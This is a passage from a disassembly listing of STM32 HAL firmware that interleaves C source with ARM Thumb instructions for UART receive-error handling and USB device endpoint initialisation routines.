          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005d02:	68fb      	ldr	r3, [r7, #12]
 8005d04:	681b      	ldr	r3, [r3, #0]
 8005d06:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005d0a:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005d0c:	68f8      	ldr	r0, [r7, #12]
 8005d0e:	f000 f81e 	bl	8005d4e <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005d12:	68fb      	ldr	r3, [r7, #12]
 8005d14:	2220      	movs	r2, #32
 8005d16:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005d1a:	68fb      	ldr	r3, [r7, #12]
 8005d1c:	2200      	movs	r2, #0
 8005d1e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005d22:	2303      	movs	r3, #3
 8005d24:	e00f      	b.n	8005d46 <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005d26:	68fb      	ldr	r3, [r7, #12]
 8005d28:	681b      	ldr	r3, [r3, #0]
 8005d2a:	69da      	ldr	r2, [r3, #28]
 8005d2c:	68bb      	ldr	r3, [r7, #8]
 8005d2e:	4013      	ands	r3, r2
 8005d30:	68ba      	ldr	r2, [r7, #8]
 8005d32:	429a      	cmp	r2, r3
 8005d34:	bf0c      	ite	eq
 8005d36:	2301      	moveq	r3, #1
 8005d38:	2300      	movne	r3, #0
 8005d3a:	b2db      	uxtb	r3, r3
 8005d3c:	461a      	mov	r2, r3
 8005d3e:	79fb      	ldrb	r3, [r7, #7]
 8005d40:	429a      	cmp	r2, r3
 8005d42:	d0a6      	beq.n	8005c92 <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005d44:	2300      	movs	r3, #0
}
 8005d46:	4618      	mov	r0, r3
 8005d48:	3710      	adds	r7, #16
 8005d4a:	46bd      	mov	sp, r7
 8005d4c:	bd80      	pop	{r7, pc}

08005d4e <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005d4e:	b480      	push	{r7}
 8005d50:	b095      	sub	sp, #84	; 0x54
 8005d52:	af00      	add	r7, sp, #0
 8005d54:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005d56:	687b      	ldr	r3, [r7, #4]
 8005d58:	681b      	ldr	r3, [r3, #0]
 8005d5a:	637b      	str	r3, [r7, #52]	; 0x34
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d5c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005d5e:	e853 3f00 	ldrex	r3, [r3]
 8005d62:	633b      	str	r3, [r7, #48]	; 0x30
   return(result);
 8005d64:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8005d66:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005d6a:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005d6c:	687b      	ldr	r3, [r7, #4]
 8005d6e:	681b      	ldr	r3, [r3, #0]
 8005d70:	461a      	mov	r2, r3
 8005d72:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005d74:	643b      	str	r3, [r7, #64]	; 0x40
 8005d76:	63fa      	str	r2, [r7, #60]	; 0x3c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d78:	6bf9      	ldr	r1, [r7, #60]	; 0x3c
 8005d7a:	6c3a      	ldr	r2, [r7, #64]	; 0x40
 8005d7c:	e841 2300 	strex	r3, r2, [r1]
 8005d80:	63bb      	str	r3, [r7, #56]	; 0x38
   return(result);
 8005d82:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005d84:	2b00      	cmp	r3, #0
 8005d86:	d1e6      	bne.n	8005d56 <UART_EndRxTransfer+0x8>
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005d88:	687b      	ldr	r3, [r7, #4]
 8005d8a:	681b      	ldr	r3, [r3, #0]
 8005d8c:	3308      	adds	r3, #8
 8005d8e:	623b      	str	r3, [r7, #32]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d90:	6a3b      	ldr	r3, [r7, #32]
 8005d92:	e853 3f00 	ldrex	r3, [r3]
 8005d96:	61fb      	str	r3, [r7, #28]
   return(result);
 8005d98:	69fb      	ldr	r3, [r7, #28]
 8005d9a:	f023 0301 	bic.w	r3, r3, #1
 8005d9e:	64bb      	str	r3, [r7, #72]	; 0x48
 8005da0:	687b      	ldr	r3, [r7, #4]
 8005da2:	681b      	ldr	r3, [r3, #0]
 8005da4:	3308      	adds	r3, #8
 8005da6:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005da8:	62fa      	str	r2, [r7, #44]	; 0x2c
 8005daa:	62bb      	str	r3, [r7, #40]	; 0x28
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005dac:	6ab9      	ldr	r1, [r7, #40]	; 0x28
 8005dae:	6afa      	ldr	r2, [r7, #44]	; 0x2c
 8005db0:	e841 2300 	strex	r3, r2, [r1]
 8005db4:	627b      	str	r3, [r7, #36]	; 0x24
   return(result);
 8005db6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005db8:	2b00      	cmp	r3, #0
 8005dba:	d1e5      	bne.n	8005d88 <UART_EndRxTransfer+0x3a>
#endif /* USART_CR1_FIFOEN */

  /* In case of reception waiting for IDLE event, disable also the IDLE IE interrupt source */
  if (huart->ReceptionType == HAL_UART_RECEPTION_TOIDLE)
 8005dbc:	687b      	ldr	r3, [r7, #4]
 8005dbe:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8005dc0:	2b01      	cmp	r3, #1
 8005dc2:	d118      	bne.n	8005df6 <UART_EndRxTransfer+0xa8>
  {
    ATOMIC_CLEAR_BIT(huart->Instance->CR1, USART_CR1_IDLEIE);
 8005dc4:	687b      	ldr	r3, [r7, #4]
 8005dc6:	681b      	ldr	r3, [r3, #0]
 8005dc8:	60fb      	str	r3, [r7, #12]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005dca:	68fb      	ldr	r3, [r7, #12]
 8005dcc:	e853 3f00 	ldrex	r3, [r3]
 8005dd0:	60bb      	str	r3, [r7, #8]
   return(result);
 8005dd2:	68bb      	ldr	r3, [r7, #8]
 8005dd4:	f023 0310 	bic.w	r3, r3, #16
 8005dd8:	647b      	str	r3, [r7, #68]	; 0x44
 8005dda:	687b      	ldr	r3, [r7, #4]
 8005ddc:	681b      	ldr	r3, [r3, #0]
 8005dde:	461a      	mov	r2, r3
 8005de0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8005de2:	61bb      	str	r3, [r7, #24]
 8005de4:	617a      	str	r2, [r7, #20]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005de6:	6979      	ldr	r1, [r7, #20]
 8005de8:	69ba      	ldr	r2, [r7, #24]
 8005dea:	e841 2300 	strex	r3, r2, [r1]
 8005dee:	613b      	str	r3, [r7, #16]
   return(result);
 8005df0:	693b      	ldr	r3, [r7, #16]
 8005df2:	2b00      	cmp	r3, #0
 8005df4:	d1e6      	bne.n	8005dc4 <UART_EndRxTransfer+0x76>
  }

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8005df6:	687b      	ldr	r3, [r7, #4]
 8005df8:	2220      	movs	r2, #32
 8005dfa:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005dfe:	687b      	ldr	r3, [r7, #4]
 8005e00:	2200      	movs	r2, #0
 8005e02:	661a      	str	r2, [r3, #96]	; 0x60

  /* Reset RxIsr function pointer */
  huart->RxISR = NULL;
 8005e04:	687b      	ldr	r3, [r7, #4]
 8005e06:	2200      	movs	r2, #0
 8005e08:	669a      	str	r2, [r3, #104]	; 0x68
}
 8005e0a:	bf00      	nop
 8005e0c:	3754      	adds	r7, #84	; 0x54
 8005e0e:	46bd      	mov	sp, r7
 8005e10:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e14:	4770      	bx	lr

08005e16 <USB_CoreInit>:
  * @param  cfg pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_CoreInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005e16:	b084      	sub	sp, #16
 8005e18:	b480      	push	{r7}
 8005e1a:	b083      	sub	sp, #12
 8005e1c:	af00      	add	r7, sp, #0
 8005e1e:	6078      	str	r0, [r7, #4]
 8005e20:	f107 0014 	add.w	r0, r7, #20
 8005e24:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005e28:	2300      	movs	r3, #0
}
 8005e2a:	4618      	mov	r0, r3
 8005e2c:	370c      	adds	r7, #12
 8005e2e:	46bd      	mov	sp, r7
 8005e30:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e34:	b004      	add	sp, #16
 8005e36:	4770      	bx	lr

08005e38 <USB_EnableGlobalInt>:
  *         Enables the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EnableGlobalInt(USB_TypeDef *USBx)
{
 8005e38:	b480      	push	{r7}
 8005e3a:	b085      	sub	sp, #20
 8005e3c:	af00      	add	r7, sp, #0
 8005e3e:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005e40:	687b      	ldr	r3, [r7, #4]
 8005e42:	2200      	movs	r2, #0
 8005e44:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005e48:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005e4c:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Set interrupt mask */
  USBx->CNTR = (uint16_t)winterruptmask;
 8005e4e:	68fb      	ldr	r3, [r7, #12]
 8005e50:	b29a      	uxth	r2, r3
 8005e52:	687b      	ldr	r3, [r7, #4]
 8005e54:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005e58:	2300      	movs	r3, #0
}
 8005e5a:	4618      	mov	r0, r3
 8005e5c:	3714      	adds	r7, #20
 8005e5e:	46bd      	mov	sp, r7
 8005e60:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e64:	4770      	bx	lr

08005e66 <USB_DisableGlobalInt>:
  *         Disable the controller's Global Int in the AHB Config reg
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DisableGlobalInt(USB_TypeDef *USBx)
{
 8005e66:	b480      	push	{r7}
 8005e68:	b085      	sub	sp, #20
 8005e6a:	af00      	add	r7, sp, #0
 8005e6c:	6078      	str	r0, [r7, #4]
  uint32_t winterruptmask;

  /* Set winterruptmask variable */
  winterruptmask = USB_CNTR_CTRM  | USB_CNTR_WKUPM |
 8005e6e:	f64b 7380 	movw	r3, #49024	; 0xbf80
 8005e72:	60fb      	str	r3, [r7, #12]
                   USB_CNTR_SUSPM | USB_CNTR_ERRM |
                   USB_CNTR_SOFM | USB_CNTR_ESOFM |
                   USB_CNTR_RESETM | USB_CNTR_L1REQM;

  /* Clear interrupt mask */
  USBx->CNTR &= (uint16_t)(~winterruptmask);
 8005e74:	687b      	ldr	r3, [r7, #4]
 8005e76:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8005e7a:	b29a      	uxth	r2, r3
 8005e7c:	68fb      	ldr	r3, [r7, #12]
 8005e7e:	b29b      	uxth	r3, r3
 8005e80:	43db      	mvns	r3, r3
 8005e82:	b29b      	uxth	r3, r3
 8005e84:	4013      	ands	r3, r2
 8005e86:	b29a      	uxth	r2, r3
 8005e88:	687b      	ldr	r3, [r7, #4]
 8005e8a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  return HAL_OK;
 8005e8e:	2300      	movs	r3, #0
}
 8005e90:	4618      	mov	r0, r3
 8005e92:	3714      	adds	r7, #20
 8005e94:	46bd      	mov	sp, r7
 8005e96:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005e9a:	4770      	bx	lr

08005e9c <USB_SetCurrentMode>:
  *          This parameter can be one of the these values:
  *            @arg USB_DEVICE_MODE Peripheral mode
  * @retval HAL status
  */
HAL_StatusTypeDef USB_SetCurrentMode(USB_TypeDef *USBx, USB_ModeTypeDef mode)
{
 8005e9c:	b480      	push	{r7}
 8005e9e:	b083      	sub	sp, #12
 8005ea0:	af00      	add	r7, sp, #0
 8005ea2:	6078      	str	r0, [r7, #4]
 8005ea4:	460b      	mov	r3, r1
 8005ea6:	70fb      	strb	r3, [r7, #3]

  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 8005ea8:	2300      	movs	r3, #0
}
 8005eaa:	4618      	mov	r0, r3
 8005eac:	370c      	adds	r7, #12
 8005eae:	46bd      	mov	sp, r7
 8005eb0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005eb4:	4770      	bx	lr

08005eb6 <USB_DevInit>:
  * @param  cfg  pointer to a USB_CfgTypeDef structure that contains
  *         the configuration information for the specified USBx peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DevInit(USB_TypeDef *USBx, USB_CfgTypeDef cfg)
{
 8005eb6:	b084      	sub	sp, #16
 8005eb8:	b480      	push	{r7}
 8005eba:	b083      	sub	sp, #12
 8005ebc:	af00      	add	r7, sp, #0
 8005ebe:	6078      	str	r0, [r7, #4]
 8005ec0:	f107 0014 	add.w	r0, r7, #20
 8005ec4:	e880 000e 	stmia.w	r0, {r1, r2, r3}
  /* Prevent unused argument(s) compilation warning */
  UNUSED(cfg);

  /* Init Device */
  /* CNTR_FRES = 1 */
  USBx->CNTR = (uint16_t)USB_CNTR_FRES;
 8005ec8:	687b      	ldr	r3, [r7, #4]
 8005eca:	2201      	movs	r2, #1
 8005ecc:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* CNTR_FRES = 0 */
  USBx->CNTR = 0U;
 8005ed0:	687b      	ldr	r3, [r7, #4]
 8005ed2:	2200      	movs	r2, #0
 8005ed4:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

  /* Clear pending interrupts */
  USBx->ISTR = 0U;
 8005ed8:	687b      	ldr	r3, [r7, #4]
 8005eda:	2200      	movs	r2, #0
 8005edc:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

  /*Set Btable Address*/
  USBx->BTABLE = BTABLE_ADDRESS;
 8005ee0:	687b      	ldr	r3, [r7, #4]
 8005ee2:	2200      	movs	r2, #0
 8005ee4:	f8a3 2050 	strh.w	r2, [r3, #80]	; 0x50

  return HAL_OK;
 8005ee8:	2300      	movs	r3, #0
}
 8005eea:	4618      	mov	r0, r3
 8005eec:	370c      	adds	r7, #12
 8005eee:	46bd      	mov	sp, r7
 8005ef0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005ef4:	b004      	add	sp, #16
 8005ef6:	4770      	bx	lr

08005ef8 <USB_FlushTxFifo>:
  *         This parameter can be a value from 1 to 15
            15 means Flush all Tx FIFOs
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushTxFifo(USB_TypeDef const *USBx, uint32_t num)
{
 8005ef8:	b480      	push	{r7}
 8005efa:	b083      	sub	sp, #12
 8005efc:	af00      	add	r7, sp, #0
 8005efe:	6078      	str	r0, [r7, #4]
 8005f00:	6039      	str	r1, [r7, #0]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005f02:	2300      	movs	r3, #0
}
 8005f04:	4618      	mov	r0, r3
 8005f06:	370c      	adds	r7, #12
 8005f08:	46bd      	mov	sp, r7
 8005f0a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005f0e:	4770      	bx	lr

08005f10 <USB_FlushRxFifo>:
  * @brief  USB_FlushRxFifo : Flush Rx FIFO
  * @param  USBx : Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef USB_FlushRxFifo(USB_TypeDef const *USBx)
{
 8005f10:	b480      	push	{r7}
 8005f12:	b083      	sub	sp, #12
 8005f14:	af00      	add	r7, sp, #0
 8005f16:	6078      	str	r0, [r7, #4]
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */

  return HAL_OK;
 8005f18:	2300      	movs	r3, #0
}
 8005f1a:	4618      	mov	r0, r3
 8005f1c:	370c      	adds	r7, #12
 8005f1e:	46bd      	mov	sp, r7
 8005f20:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005f24:	4770      	bx	lr
	...

08005f28 <USB_ActivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_ActivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8005f28:	b480      	push	{r7}
 8005f2a:	b09d      	sub	sp, #116	; 0x74
 8005f2c:	af00      	add	r7, sp, #0
 8005f2e:	6078      	str	r0, [r7, #4]
 8005f30:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef ret = HAL_OK;
 8005f32:	2300      	movs	r3, #0
 8005f34:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
  uint16_t wEpRegVal;

  wEpRegVal = PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_T_MASK;
 8005f38:	687a      	ldr	r2, [r7, #4]
 8005f3a:	683b      	ldr	r3, [r7, #0]
 8005f3c:	781b      	ldrb	r3, [r3, #0]
 8005f3e:	009b      	lsls	r3, r3, #2
 8005f40:	4413      	add	r3, r2
 8005f42:	881b      	ldrh	r3, [r3, #0]
 8005f44:	b29b      	uxth	r3, r3
 8005f46:	f423 43ec 	bic.w	r3, r3, #30208	; 0x7600
 8005f4a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005f4e:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c

  /* initialize Endpoint */
  switch (ep->type)
 8005f52:	683b      	ldr	r3, [r7, #0]
 8005f54:	78db      	ldrb	r3, [r3, #3]
 8005f56:	2b03      	cmp	r3, #3
 8005f58:	d81f      	bhi.n	8005f9a <USB_ActivateEndpoint+0x72>
 8005f5a:	a201      	add	r2, pc, #4	; (adr r2, 8005f60 <USB_ActivateEndpoint+0x38>)
 8005f5c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005f60:	08005f71 	.word	0x08005f71
 8005f64:	08005f8d 	.word	0x08005f8d
 8005f68:	08005fa3 	.word	0x08005fa3
 8005f6c:	08005f7f 	.word	0x08005f7f
  {
    case EP_TYPE_CTRL:
      wEpRegVal |= USB_EP_CONTROL;
 8005f70:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f74:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8005f78:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f7c:	e012      	b.n	8005fa4 <USB_ActivateEndpoint+0x7c>
    case EP_TYPE_BULK:
      wEpRegVal |= USB_EP_BULK;
      break;

    case EP_TYPE_INTR:
      wEpRegVal |= USB_EP_INTERRUPT;
 8005f7e:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f82:	f443 63c0 	orr.w	r3, r3, #1536	; 0x600
 8005f86:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f8a:	e00b      	b.n	8005fa4 <USB_ActivateEndpoint+0x7c>

    case EP_TYPE_ISOC:
      wEpRegVal |= USB_EP_ISOCHRONOUS;
 8005f8c:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005f90:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8005f94:	f8a7 306c 	strh.w	r3, [r7, #108]	; 0x6c
      break;
 8005f98:	e004      	b.n	8005fa4 <USB_ActivateEndpoint+0x7c>

    default:
      ret = HAL_ERROR;
 8005f9a:	2301      	movs	r3, #1
 8005f9c:	f887 306f 	strb.w	r3, [r7, #111]	; 0x6f
      break;
 8005fa0:	e000      	b.n	8005fa4 <USB_ActivateEndpoint+0x7c>
      break;
 8005fa2:	bf00      	nop
  }

  PCD_SET_ENDPOINT(USBx, ep->num, (wEpRegVal | USB_EP_CTR_RX | USB_EP_CTR_TX));
 8005fa4:	687a      	ldr	r2, [r7, #4]
 8005fa6:	683b      	ldr	r3, [r7, #0]
 8005fa8:	781b      	ldrb	r3, [r3, #0]
 8005faa:	009b      	lsls	r3, r3, #2
 8005fac:	441a      	add	r2, r3
 8005fae:	f8b7 306c 	ldrh.w	r3, [r7, #108]	; 0x6c
 8005fb2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8005fb6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8005fba:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8005fbe:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8005fc2:	b29b      	uxth	r3, r3
 8005fc4:	8013      	strh	r3, [r2, #0]

  PCD_SET_EP_ADDRESS(USBx, ep->num, ep->num);
 8005fc6:	687a      	ldr	r2, [r7, #4]
 8005fc8:	683b      	ldr	r3, [r7, #0]
 8005fca:	781b      	ldrb	r3, [r3, #0]
 8005fcc:	009b      	lsls	r3, r3, #2
 8005fce:	4413      	add	r3, r2
 8005fd0:	881b      	ldrh	r3, [r3, #0]
 8005fd2:	b29b      	uxth	r3, r3
 8005fd4:	b21b      	sxth	r3, r3
 8005fd6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8005fda:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8005fde:	b21a      	sxth	r2, r3
 8005fe0:	683b      	ldr	r3, [r7, #0]
 8005fe2:	781b      	ldrb	r3, [r3, #0]
 8005fe4:	b21b      	sxth	r3, r3
 8005fe6:	4313      	orrs	r3, r2
 8005fe8:	b21b      	sxth	r3, r3
 8005fea:	f8a7 3066 	strh.w	r3, [r7, #102]	; 0x66
 8005fee:	687a      	ldr	r2, [r7, #4]
 8005ff0:	683b      	ldr	r3, [r7, #0]
 8005ff2:	781b      	ldrb	r3, [r3, #0]
 8005ff4:	009b      	lsls	r3, r3, #2
 8005ff6:	441a      	add	r2, r3
 8005ff8:	f8b7 3066 	ldrh.w	r3, [r7, #102]	; 0x66
 8005ffc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006000:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006004:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006008:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800600c:	b29b      	uxth	r3, r3
 800600e:	8013      	strh	r3, [r2, #0]

  if (ep->doublebuffer == 0U)
 8006010:	683b      	ldr	r3, [r7, #0]
 8006012:	7b1b      	ldrb	r3, [r3, #12]
 8006014:	2b00      	cmp	r3, #0
 8006016:	f040 8178 	bne.w	800630a <USB_ActivateEndpoint+0x3e2>
  {
    if (ep->is_in != 0U)
 800601a:	683b      	ldr	r3, [r7, #0]
 800601c:	785b      	ldrb	r3, [r3, #1]
 800601e:	2b00      	cmp	r3, #0
 8006020:	f000 8084 	beq.w	800612c <USB_ActivateEndpoint+0x204>
    {
      /*Set the endpoint Transmit buffer address */
      PCD_SET_EP_TX_ADDRESS(USBx, ep->num, ep->pmaadress);
 8006024:	687b      	ldr	r3, [r7, #4]
 8006026:	61bb      	str	r3, [r7, #24]
 8006028:	687b      	ldr	r3, [r7, #4]
 800602a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800602e:	b29b      	uxth	r3, r3
 8006030:	461a      	mov	r2, r3
 8006032:	69bb      	ldr	r3, [r7, #24]
 8006034:	4413      	add	r3, r2
 8006036:	61bb      	str	r3, [r7, #24]
 8006038:	683b      	ldr	r3, [r7, #0]
 800603a:	781b      	ldrb	r3, [r3, #0]
 800603c:	00da      	lsls	r2, r3, #3
 800603e:	69bb      	ldr	r3, [r7, #24]
 8006040:	4413      	add	r3, r2
 8006042:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 8006046:	617b      	str	r3, [r7, #20]
 8006048:	683b      	ldr	r3, [r7, #0]
 800604a:	88db      	ldrh	r3, [r3, #6]
 800604c:	085b      	lsrs	r3, r3, #1
 800604e:	b29b      	uxth	r3, r3
 8006050:	005b      	lsls	r3, r3, #1
 8006052:	b29a      	uxth	r2, r3
 8006054:	697b      	ldr	r3, [r7, #20]
 8006056:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006058:	687a      	ldr	r2, [r7, #4]
 800605a:	683b      	ldr	r3, [r7, #0]
 800605c:	781b      	ldrb	r3, [r3, #0]
 800605e:	009b      	lsls	r3, r3, #2
 8006060:	4413      	add	r3, r2
 8006062:	881b      	ldrh	r3, [r3, #0]
 8006064:	827b      	strh	r3, [r7, #18]
 8006066:	8a7b      	ldrh	r3, [r7, #18]
 8006068:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800606c:	2b00      	cmp	r3, #0
 800606e:	d01b      	beq.n	80060a8 <USB_ActivateEndpoint+0x180>
 8006070:	687a      	ldr	r2, [r7, #4]
 8006072:	683b      	ldr	r3, [r7, #0]
 8006074:	781b      	ldrb	r3, [r3, #0]
 8006076:	009b      	lsls	r3, r3, #2
 8006078:	4413      	add	r3, r2
 800607a:	881b      	ldrh	r3, [r3, #0]
 800607c:	b29b      	uxth	r3, r3
 800607e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006082:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006086:	823b      	strh	r3, [r7, #16]
 8006088:	687a      	ldr	r2, [r7, #4]
 800608a:	683b      	ldr	r3, [r7, #0]
 800608c:	781b      	ldrb	r3, [r3, #0]
 800608e:	009b      	lsls	r3, r3, #2
 8006090:	441a      	add	r2, r3
 8006092:	8a3b      	ldrh	r3, [r7, #16]
 8006094:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006098:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800609c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80060a0:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80060a4:	b29b      	uxth	r3, r3
 80060a6:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80060a8:	683b      	ldr	r3, [r7, #0]
 80060aa:	78db      	ldrb	r3, [r3, #3]
 80060ac:	2b01      	cmp	r3, #1
 80060ae:	d020      	beq.n	80060f2 <USB_ActivateEndpoint+0x1ca>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80060b0:	687a      	ldr	r2, [r7, #4]
 80060b2:	683b      	ldr	r3, [r7, #0]
 80060b4:	781b      	ldrb	r3, [r3, #0]
 80060b6:	009b      	lsls	r3, r3, #2
 80060b8:	4413      	add	r3, r2
 80060ba:	881b      	ldrh	r3, [r3, #0]
 80060bc:	b29b      	uxth	r3, r3
 80060be:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80060c2:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80060c6:	81bb      	strh	r3, [r7, #12]
 80060c8:	89bb      	ldrh	r3, [r7, #12]
 80060ca:	f083 0320 	eor.w	r3, r3, #32
 80060ce:	81bb      	strh	r3, [r7, #12]
 80060d0:	687a      	ldr	r2, [r7, #4]
 80060d2:	683b      	ldr	r3, [r7, #0]
 80060d4:	781b      	ldrb	r3, [r3, #0]
 80060d6:	009b      	lsls	r3, r3, #2
 80060d8:	441a      	add	r2, r3
 80060da:	89bb      	ldrh	r3, [r7, #12]
 80060dc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80060e0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80060e4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80060e8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80060ec:	b29b      	uxth	r3, r3
 80060ee:	8013      	strh	r3, [r2, #0]
